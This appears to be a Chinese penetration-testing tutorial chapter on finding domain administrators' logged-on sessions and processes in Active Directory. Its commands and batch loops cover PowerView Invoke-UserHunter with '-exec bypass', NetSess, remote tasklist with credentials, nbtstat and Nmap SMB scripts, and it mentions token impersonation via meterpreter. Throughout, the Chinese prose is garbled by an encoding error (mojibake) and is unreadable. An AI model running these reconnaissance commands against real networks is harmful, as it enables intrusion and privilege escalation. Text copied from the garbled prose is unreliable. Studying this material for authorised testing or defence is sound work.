<p>â€‹        <code>PVEFindADUser.exe</code>çš„ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8F%82%E6%95%B0%EF%BC%9A">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOnï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åŠå‚æ•°ï¼š</a></p>
<ul>
<li><p>-h: æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚</p>
</li>
<li><p>-u: æ£€æŸ¥ç¨‹åºæ˜¯å¦æœ‰æ–°ç‰ˆæœ¬ã€‚</p>
</li>
<li><p>-current[â€œusernameâ€]: å¦‚æœä»…æŒ‡å®šäº†-currentå‚æ•°ï¼Œå°†è·å–ç›®æ ‡è®¡ç®—æœºä¸Šå½“å‰ç™»å½•çš„æ‰€æœ‰ç”¨æˆ·ã€‚å¦‚æœæŒ‡å®šäº†ç”¨æˆ·å(Domain\Username)ï¼Œåˆ™æ˜¾ç¤ºè¯¥ç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºã€‚</p>
</li>
<li><p>-last[â€œusernameâ€]: å¦‚æœä»…æŒ‡å®šäº†-lastå‚æ•°ï¼Œå°†è·å–ç›®æ ‡è®¡ç®—æœºçš„æœ€åä¸€ä¸ªç™»å½•ç”¨æˆ·ã€‚å¦‚æœæŒ‡å®šäº†ç”¨æˆ·åï¼ˆDomain\Username),åˆ™æ˜¾ç¤ºæ­¤ç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„è®¡ç®—æœºã€‚æ ¹æ®ç½‘ç»œçš„å®‰å…¨ç­–ç•¥ï¼Œå¯èƒ½ä¼šéšè—æœ€åä¸€ä¸ªç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åï¼Œæ­¤æ—¶ä½¿ç”¨è¯¥å·¥å…·å¯èƒ½æ— æ³•å¾—åˆ°è¯¥ç”¨æˆ·åã€‚</p>
</li>
<li><p>-noping: é˜»æ­¢è¯¥å·¥å…·åœ¨å°è¯•è·å–ç”¨æˆ·ç™»å½•ä¿¡æ¯ä¹‹å‰å¯¹ç›®æ ‡è®¡ç®—æœºæ‰§è¡Œpingå‘½ä»¤ã€‚</p>
</li>
<li><p>-target: å¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šè¦æŸ¥è¯¢çš„ä¸»æœºã€‚å¦‚æœæœªæŒ‡å®šæ­¤å‚æ•°ï¼Œå°†æŸ¥è¯¢å½“å‰åŸŸä¸­çš„æ‰€æœ‰ä¸»æœºã€‚å¦‚æœæŒ‡å®šäº†æ­¤å‚æ•°ï¼Œåˆ™åè·Ÿä¸€ä¸ªç”±é€—å·åˆ†éš”çš„ä¸»æœºååˆ—è¡¨ã€‚</p>
</li>
</ul>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220505084347500.png" alt="image-20220505084347500" style="zoom:67%;" />

<p>ç›´æ¥è¿è¡Œ<code>pveadfinduser.exe -current</code>å‘½ä»¤ï¼Œå³å¯æ˜¾ç¤ºåŸŸä¸­æ‰€æœ‰è®¡ç®—æœºï¼ˆè®¡ç®—æœºã€æœåŠ¡å™¨ã€åŸŸæ§åˆ¶å™¨ç­‰)ä¸Šå½“å‰ç™»å½•çš„æ‰€æœ‰ç”¨æˆ·ã€‚æŸ¥è¯¢ç»“æœå°†è¢«è¾“å‡ºåˆ° report.csv æ–‡ä»¶ä¸­ã€‚</p>
<p><strong>3.Netview.exe</strong><br>        <code>netview.exe</code>æ˜¯ä¸€ä¸ªæšä¸¾å·¥å…·ï¼Œä½¿ç”¨ WinAPI æšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨ NetSessionEnum æ‰¾å¯»ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨ NetShareEnum æ‰¾å¯»å…±äº«ï¼Œåˆ©ç”¨ Net WkstaUserEnumæšä¸¾ç™»å½•çš„ç”¨æˆ·ã€‚åŒæ—¶ï¼Œnetview.exeèƒ½å¤ŸæŸ¥è¯¢å…±äº«å…¥å£å’Œæœ‰ä»·å€¼çš„ç”¨æˆ·ã€‚netview.exeçš„ç»å¤§éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ç®¡ç†å‘˜æƒé™å°±å¯ä»¥ä½¿ç”¨ï¼Œnetview.exeçš„ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/mubix/netview/releases/tag/latest">https://github.com/mubix/netview/releases/tag/latest</a></p>
<p>å…¶å‘½ä»¤æ ¼å¼åŠå‚æ•°å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>h: æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚</p>
</li>
<li><p>-f filename.txt: æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„æ–‡ä»¶ã€‚</p>
</li>
<li><p>-e filename.txt: æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåçš„æ–‡ä»¶ã€‚</p>
</li>
<li><p>-o filename.txt: å°†æ‰€æœ‰è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ã€‚</p>
</li>
<li><p>-d domain: æŒ‡å®šè¦æå–ä¸»æœºåˆ—è¡¨çš„åŸŸã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä»å½“å‰åŸŸä¸­æå–ä¸»æœºåˆ—è¡¨ã€‚</p>
</li>
<li><p>-g group: æŒ‡å®šæœç´¢çš„ç»„åã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™åœ¨Domain Adminsç»„ä¸­æœç´¢ã€‚</p>
</li>
<li><p>-c: å¯¹å·²æ‰¾åˆ°çš„å…±äº«ç›®å½•/æ–‡ä»¶çš„è®¿é—®æƒé™è¿›è¡Œæ£€æŸ¥ã€‚</p>
</li>
</ul>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220505095404707.png" alt="image-20220505095404707" style="zoom:50%;" />

<p><strong>4.Nmapçš„NSEè„šæœ¬</strong></p>
<p>â€‹        å¦‚æœå­˜åœ¨åŸŸè´¦æˆ·æˆ–è€…æœ¬åœ°è´¦æˆ·ï¼Œå°±å¯ä»¥ä½¿ç”¨Nmapçš„<code>smb-enum-sessions.nse</code>å¼•æ“è·å–è¿œç¨‹æœºå™¨çš„ç™»å½•ä¼šè¯ã€”ä¸éœ€è¦ç®¡ç†å‘˜æƒé™)ï¼Œä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
<pre><code class="hljs bash">nmap --script=smb-os-discovery.nse 192.168.0.197</code></pre>

<ul>
<li>smb-enum-domains.nseï¼š å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ã€ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰ã€‚</li>
<li>smb-enum-users.nseï¼šåœ¨è¿›è¡ŒåŸŸæ¸—é€æµ‹è¯•æ—¶ï¼Œå¦‚æœè·å¾—äº†åŸŸå†…æŸå°ä¸»æœºçš„æƒé™ï¼Œä½†æ˜¯æƒé™æœ‰é™ï¼Œæ— æ³•è·å–æ›´å¤šçš„åŸŸç”¨æˆ·ä¿¡æ¯ï¼Œå°±å¯ä»¥å€ŸåŠ©è¿™ä¸ªè„šæœ¬å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œæ‰«æã€‚</li>
<li>smb-enum-shares.nseï¼šéå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½•ã€‚</li>
<li>smb-enum-processes.nseï¼šå¯¹ä¸»æœºçš„ç³»ç»Ÿè¿›ç¨‹è¿›è¡Œéå†ã€‚é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œå¯ä»¥çŸ¥é“ç›®æ ‡ä¸»æœºä¸Šæ­£åœ¨è¿è¡Œå“ªäº›è½¯ä»¶ã€‚</li>
<li>smb-enum-sessions.nseï¼šè·å–åŸŸå†…ä¸»æœºçš„ç”¨æˆ·ç™»å½•ä¼šè¯ï¼ŒæŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰ç”¨æˆ·ç™»å½•ã€‚</li>
<li>smb-os-discovery.nseï¼šæ”¶é›†ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿã€è®¡ç®—æœºåã€åŸŸåã€åŸŸæ—åç§°ã€NetBIOSæœºå™¨åã€NetBIOSåŸŸåã€å·¥ä½œç»„ã€ç³»ç»Ÿæ—¶é—´ç­‰ä¿¡æ¯ã€‚</li>
</ul>
<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220601003437112.png" alt="image-20220601003437112" style="zoom:50%;" />

<p><strong>5.PowerViewè„šæœ¬</strong></p>
<p>â€‹       PowerViewæ˜¯ä¸€æ¬¾PowerShellè„šæœ¬ï¼Œæä¾›äº†è¾…åŠ©å®šä½å…³é”®ç”¨æˆ·çš„åŠŸèƒ½ï¼Œå…¶ä¸‹è½½åœ°å€ï¼š</p>
<ul>
<li><p>Invoke-StealthUserHunterï¼šåªéœ€è¦è¿›è¡Œä¸€æ¬¡æŸ¥è¯¢ï¼Œå°±å¯ä»¥è·å–åŸŸé‡Œé¢çš„æ‰€æœ‰ç”¨æˆ·ã€‚ä½¿ç”¨æ–¹æ³•ä¸ºï¼Œä»user.HomeDirectoriesä¸­æå–æ‰€æœ‰ç”¨æˆ·ï¼Œå¹¶å¯¹æ¯å°æœåŠ¡å™¨è¿›è¡ŒGet-NetSessionsè·å–ã€‚å› ä¸ºä¸éœ€è¦ä½¿ç”¨Invoke-UserHunterå¯¹æ¯å°æœºå™¨è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•çš„éšè”½æ€§ç›¸å¯¹è¾ƒé«˜(ä½†æ¶‰åŠçš„æœºå™¨ä¸ä¸€å®šå…¨é¢)ã€‚PowerView é»˜è®¤ä½¿ç”¨ Invoke-StealthUserHunterï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå°±ä½¿ç”¨Invoke-UserHunterã€‚</p>
</li>
<li><p>Invoke-UserHunterï¼šæ‰¾åˆ°åŸŸå†…ç‰¹å®šçš„ç”¨æˆ·ç¾¤ï¼Œæ¥æ”¶ç”¨æˆ·åã€ç”¨æˆ·åˆ—è¡¨å’ŒåŸŸç»„æŸ¥è¯¢ï¼Œæ¥æ”¶ä¸€ä¸ªä¸»æœºåˆ—è¡¨æˆ–æŸ¥è¯¢å¯ç”¨çš„ä¸»æœºåŸŸåã€‚å®ƒå¯ä»¥ä½¿ç”¨ Get-NetSessions å’Œ Get-NetLoggedonï¼ˆè°ƒç”¨NetSessionEnumå’ŒNetWkstaUserEnum API) æ‰«ææ¯å°æœåŠ¡å™¨å¹¶å¯¹æ‰«æç»“æœè¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œæ‰¾å‡ºç›®æ ‡ç”¨æˆ·é›†ï¼Œåœ¨ä½¿ç”¨æ—¶<strong>ä¸éœ€è¦ç®¡ç†å‘˜æƒé™</strong>ã€‚</p>
</li>
</ul>
<pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;&amp;&#123;Import-Module .\PowerView.ps1;Invoke-UserHunter&#125;&quot;</span></code></pre>

<p>â€‹    <img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220601011239130.png" alt="image-20220601011239130"></p>
<p><strong>6.Empireçš„user_hunteræ¨¡å—</strong></p>
<p>â€‹        åœ¨Empireä¸­ä¹Ÿæœ‰ç±»ä¼¼Invoke-UserHunterçš„æ¨¡å—ä¸€user hunterã€‚è¿™ä¸ªæ¨¡å—ç”¨äºæŸ¥æ‰¾åŸŸç®¡ç†å‘˜ç™»å½•çš„æœºå™¨ã€‚ä½¿ç”¨<code>usemodule situational awareness/network/powerview/user_hunter</code>æ¨¡å—ï¼Œå¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°å“ªä¸ªç”¨æˆ·ç™»å½•äº†å“ªå°ä¸»æœºã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220602111555677.png" alt="image-20220602111555677"></p>
<h2 id="2-11-æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"><a href="#2-11-æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹" class="headerlink" title="2.11 æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹"></a>2.11 æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹</h2><p>â€‹        åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œä¸€ä¸ªå…¸å‹çš„åŸŸæƒé™æå‡è¿‡ç¨‹ï¼Œé€šå¸¸å›´ç»•ç€æ”¶é›†æ˜æ–‡å‡­æ®æˆ–è€…é€šè¿‡mimikatzææƒç­‰æ–¹æ³•ï¼Œåœ¨è·å–äº†ç®¡ç†å‘˜æƒé™çš„ç³»ç»Ÿä¸­å¯»æ‰¾åŸŸç®¡ç†å‘˜ç™»å½•è¿›ç¨‹ï¼Œè¿›è€Œæ”¶é›†åŸŸç®¡ç†å‘˜çš„å‡­æ®ã€‚å¦‚æœå†…ç½‘ç¯å¢ƒéå¸¸å¤æ‚ï¼Œæ¸—é€æµ‹è¯•äººå‘˜æ— æ³•ç«‹å³åœ¨æ‹¥æœ‰æƒé™çš„ç³»ç»Ÿä¸­è·å¾—åŸŸç®¡ç†å‘˜è¿›ç¨‹ï¼Œé‚£ä¹ˆé€šå¸¸å¯ä»¥é‡‡ç”¨çš„æ–¹æ³•æ˜¯ï¼šåœ¨è·³æ¿æœºä¹‹é—´è·³è½¬ï¼Œç›´è‡³è·å¾—åŸŸç®¡ç†å‘˜æƒé™ï¼ŒåŒæ—¶è¿›è¡Œä¸€äº›åˆ†æå·¥ä½œï¼Œè¿›è€Œæ‰¾åˆ°æ¸—é€æµ‹è¯•çš„è·¯å¾„ã€‚</p>
<h3 id="2-11-1-æœ¬æœºæ£€æŸ¥"><a href="#2-11-1-æœ¬æœºæ£€æŸ¥" class="headerlink" title="2.11.1 æœ¬æœºæ£€æŸ¥"></a>2.11.1 æœ¬æœºæ£€æŸ¥</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1ã€è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</span>
net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain
<span class="hljs-comment"># 2ã€åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰è¿›ç¨‹ä»¥åŠè¿›ç¨‹ç”¨æˆ·</span>
tasklist /v
<span class="hljs-comment"># 3ã€å¯»æ‰¾è¿›ç¨‹ä¸ºç®¡ç†çš„çš„è¿›ç¨‹</span></code></pre>

<h3 id="2-11-2-æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯"><a href="#2-11-2-æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯" class="headerlink" title="2.11.2 æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯"></a>2.11.2 æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯</h3><p>â€‹        æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯ï¼Œå…¶åŸç†æ˜¯ï¼šåœ¨åŸŸæ§åˆ¶å™¨ä¸­æŸ¥è¯¢åŸŸç”¨æˆ·ä¼šè¯åˆ—è¡¨ï¼Œå¹¶å°†å…¶ä¸åŸŸç®¡ç†å‘˜åˆ—è¡¨è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œä»è€Œå¾—åˆ°åŸŸç®¡ç†ä¼šè¯çš„ç³»ç»Ÿåˆ—è¡¨ã€‚</p>
<p><strong>1ã€æŸ¥è¯¢åŸŸæ§åˆ¶å™¨åˆ—è¡¨</strong></p>
<p>â€‹       å¯ä»¥ä½¿ç”¨LDAPæŸ¥è¯¢ä»Domain Controllers å•å…ƒä¸­æœé›†çš„åŸŸæ§åˆ¶å™¨åˆ—è¡¨ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨net å‘½ä»¤æŸ¥è¯¢åŸŸæ§åˆ¶å™¨åˆ—è¡¨ã€‚</p>
<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain</code></pre>

<p><strong>2ã€æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨</strong></p>
<p>â€‹       å¯ä»¥ä½¿ç”¨LDAPè¿›è¡ŒæŸ¥è¯¢ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨netå‘½ä»¤ï¼Œä»åŸŸç®¡ç†å‘˜ç»„ä¸­æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨.</p>
<pre><code class="hljs bash">net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain</code></pre>

<p><strong>3ã€æœé›†æ‰€æœ‰æ´»åŠ¨åŸŸçš„ä¼šè¯åˆ—è¡¨</strong></p>
<p>â€‹       ä½¿ç”¨<code>netsess.exe</code>æŸ¥è¯¢æ¯ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œæ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸä¼šè¯åˆ—è¡¨ã€‚<code>netsess.exe</code>æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„å·¥å…·ï¼Œå®ƒåŒ…å«æœ¬åœ°Windowså‡½æ•°<code>netsessionenum</code>ã€‚<code>netsessionenum</code>å‡½æ•°ç”¨äºè¿”å›æ´»åŠ¨ä¼šè¯çš„IPåœ°å€ã€åŸŸè´¦æˆ·ã€ä¼šè¯å¼€å§‹æ—¶é—´å’Œç©ºé—²æ—¶é—´ã€‚</p>
<p>ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/netsess/index.htm">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
<p>æ“ä½œè¯´æ˜ï¼š</p>
<pre><code class="hljs plaintext">PS C:\Users\lisi&gt; .\NetSess.exe /?

   -full          å®Œæ•´ä¼šè¯ä¿¡æ¯ï¼ˆéœ€è¦ç®¡ç†å‘˜ï¼‰
   -h servername  æŒ‡å®šæœåŠ¡å™¨
   -u username    è¦ç­›é€‰çš„ç”¨æˆ·å
   -c client name æŒ‡å®šå®¢æˆ·ç«¯åç§°
   
  Ex1:
    netsess
      æ˜¾ç¤ºæœ¬åœ°è®¡ç®—æœºçš„ä¼šè¯ä¿¡æ¯

  Ex2:
    netsess servername
      æ˜¾ç¤ºæœåŠ¡å™¨çš„ä¼šè¯ä¿¡æ¯

  Ex3:
    netsess servername /full
      æ˜¾ç¤ºæœåŠ¡å™¨çš„å®Œæ•´ä¼šè¯ä¿¡æ¯</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220603181811139.png" alt="image-20220603181811139"></p>
<p><strong>4ã€äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨</strong></p>
<p>â€‹      å¯¹åŸŸç®¡ç†å‘˜åˆ—è¡¨å’Œæ´»åŠ¨ä¼šè¯åˆ—è¡¨è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œå¯ä»¥ç¡®å®šå“ªäº›Påœ°å€æœ‰<strong>æ´»åŠ¨åŸŸä»¤ç‰Œ</strong>ã€‚ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹åˆ—è„šæœ¬å¿«é€Ÿä½¿ç”¨<code>netsess.exe</code>çš„Windowså‘½ä»¤è¡Œã€‚å°†åŸŸæ§åˆ¶å™¨åˆ—è¡¨æ·»åŠ åˆ°dcs.txtä¸­ï¼Œå°†åŸŸç®¡ç†å‘˜åˆ—è¡¨æ·»åŠ åˆ°admins.txtä¸­ï¼Œå¹¶ä¸netsess.exeæ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚è¿è¡Œä»¥ä¸‹è„šæœ¬ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶sessions.txtã€‚</p>
<pre><code class="hljs vbscript"># bat è„šæœ¬ï¼ˆå¤šåŠ %å·ï¼‰
@echo off
<span class="hljs-keyword">FOR</span> /F %%i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @echo [+] Querying DC %%i &amp;&amp; @NetSess.exe -h %%i <span class="hljs-number">2</span>&gt;nul&gt;sessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %%a <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @type sessions.txt | @findstr /I %%a

# cmdå‘½ä»¤è¡Œ
<span class="hljs-keyword">FOR</span> /F %i <span class="hljs-keyword">in</span> (dcs.txt) <span class="hljs-keyword">do</span> @echo [+] Querying DC %i &amp;&amp; @netsess -h %i <span class="hljs-number">2</span>&gt;nul &gt; sessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %a <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @type sessions.txt | @findstr /I %a</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604005143711.png" alt="image-20220604005143711"></p>
<p>å…¶ä»–è„šæœ¬ï¼š[Get Domain Adminsï¼ˆGDAï¼‰ã€Get Domain Usersï¼ˆGDUï¼‰ï¼Œä¸‹è½½é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/nullbind/Other-Projects">https://github.com/nullbind/Other-Projects</a></p>
<h3 id="2-11-3-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"><a href="#2-11-3-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡" class="headerlink" title="2.11.3 æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"></a>2.11.3 æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡</h3><p>å¦‚æœç›®æ ‡æœºå™¨åœ¨åŸŸç³»ç»Ÿä¸­æ˜¯é€šè¿‡å…±äº«çš„æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·è¿è¡Œçš„ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸‹åˆ—è„šæœ¬æ¥æŸ¥è¯¢ç³»ç»Ÿä¸­çš„åŸŸç®¡ç†ä»»åŠ¡ã€‚é¦–å…ˆï¼Œä»Domain Adminsç»„ä¸­æ”¶é›†åŸŸç®¡ç†å‘˜åˆ—è¡¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs powershell">net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain</code></pre>

<p>è¿è¡Œå¦‚ä¸‹è„šæœ¬ï¼Œå°†ç›®æ ‡åŸŸç³»ç»Ÿåˆ—è¡¨æ·»åŠ åˆ°ips.txtæ–‡ä»¶ä¸­ï¼Œå°†æ”¶é›†çš„åŸŸç®¡ç†å‘˜åˆ—è¡¨æ·»åŠ åˆ°names.txtæ–‡ä»¶ä¸­ã€‚</p>
<pre><code class="hljs powershell"><span class="hljs-keyword">FOR</span> /F %i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">echo</span> [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password <span class="hljs-number">2</span>&gt;NUL &gt; output.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %n <span class="hljs-keyword">in</span> (names.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> output.txt | findstr %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found running a <span class="hljs-keyword">process</span> on %i &amp;&amp; pause

<span class="hljs-comment"># </span>
@<span class="hljs-built_in">echo</span> off
<span class="hljs-keyword">FOR</span> /F %%i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">echo</span> [+] %%i &amp;&amp; @tasklist /V /S %%i /U user /P password <span class="hljs-number">2</span>&gt;NUL &gt; output.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %%n <span class="hljs-keyword">in</span> (names.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> output.txt | findstr %%n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %%n was found running a <span class="hljs-keyword">process</span> on %%i &amp;&amp; pause</code></pre>

<h3 id="2-11-4-æ‰«æè¿œç¨‹ç³»ç»Ÿçš„NetBIOSä¿¡æ¯"><a href="#2-11-4-æ‰«æè¿œç¨‹ç³»ç»Ÿçš„NetBIOSä¿¡æ¯" class="headerlink" title="2.11.4 æ‰«æè¿œç¨‹ç³»ç»Ÿçš„NetBIOSä¿¡æ¯"></a>2.11.4 æ‰«æè¿œç¨‹ç³»ç»Ÿçš„NetBIOSä¿¡æ¯</h3><p>â€‹        æŸäº›ç‰ˆæœ¬çš„Windowsæ“ä½œç³»ç»Ÿå…è®¸ç”¨æˆ·é€šè¿‡NetBIOSæŸ¥è¯¢å·²ç™»å½•ç”¨æˆ·ã€‚ä¸‹é¢è¿™ä¸ªWindowså‘½ä»¤è¡Œè„šæœ¬å°±ç”¨äºæ‰«æè¿œç¨‹ç³»ç»Ÿæ´»è·ƒåŸŸä¸­çš„ç®¡ç†ä¼šè¯ã€‚</p>
<pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> [+] Checking %i &amp;&amp; nbtstat <span class="hljs-literal">-A</span> %i <span class="hljs-number">2</span>&gt;NUL &gt;nbsessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %n <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604015055474.png" alt="image-20220604015055474"></p>
<p>åˆ©ç”¨nbtscanæ‰«æï¼š<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/InformationGathering/tree/master/nbtscan">https://github.com/SevenC-base/InformationGathering/tree/master/nbtscan</a></p>
<pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span>[+] Checking %i &amp;&amp; nbtscan <span class="hljs-operator">-f</span> %i <span class="hljs-number">2</span>&gt;NUL &gt;nbsessions.txt &amp;&amp; <span class="hljs-keyword">FOR</span> /F %n <span class="hljs-keyword">in</span> (admins.txt) <span class="hljs-keyword">DO</span> @<span class="hljs-built_in">type</span> nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; <span class="hljs-built_in">echo</span> [!] %n was found logged into %i</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220604015430681.png" alt="image-20220604015430681"></p>
<h2 id="2-12-åŸŸç®¡ç†å‘˜æ–¹æ³•æ¨¡æ‹Ÿç®€ä»‹"><a href="#2-12-åŸŸç®¡ç†å‘˜æ–¹æ³•æ¨¡æ‹Ÿç®€ä»‹" class="headerlink" title="2.12 åŸŸç®¡ç†å‘˜æ–¹æ³•æ¨¡æ‹Ÿç®€ä»‹"></a>2.12 åŸŸç®¡ç†å‘˜æ–¹æ³•æ¨¡æ‹Ÿç®€ä»‹</h2><p>â€‹        åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œå¦‚æœå·²ç»æ‹¥æœ‰ä¸€ä¸ªmeterpreterä¼šè¯ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>incognito</code>æ¥æ¨¡æ‹ŸåŸŸç®¡ç†å‘˜æˆ–è€…æ·»åŠ ä¸€ä¸ªåŸŸç®¡ç†å‘˜ï¼Œé€šè¿‡å°è¯•éå†ç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„æˆæƒä»¤ç‰Œæ¥æ·»åŠ æ–°çš„ç®¡ç†å‘˜ã€‚å…·ä½“æ“ä½œæ–¹æ³•å°†åœ¨ç¬¬4ç« è¯¦ç»†è®²è§£ï¼Œè§ 4.5.1ã€‚</p>
